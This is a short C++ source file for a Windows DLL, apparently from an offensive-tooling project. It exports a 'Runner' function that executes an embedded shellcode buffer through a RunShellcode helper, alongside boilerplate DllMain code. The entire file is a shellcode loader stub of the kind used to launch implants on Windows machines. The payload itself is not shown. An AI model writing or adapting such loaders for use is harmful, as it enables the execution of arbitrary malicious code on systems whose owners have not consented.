#include <Maverick.h>
#include <Shellcode.h>

EXTERN_C auto DLLEXPORT Runner(VOID) -> VOID {
    RunShellcode(Shellcode::Data, Shellcode::Size);
}

auto WINAPI DllMain(
    HINSTANCE DllInstance,
    ULONG     Reason,
    PVOID     Reserved
) -> BOOL {
    switch (Reason) {
        case DLL_PROCESS_ATTACH:
            DisableThreadLibraryCalls(DllInstance);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}
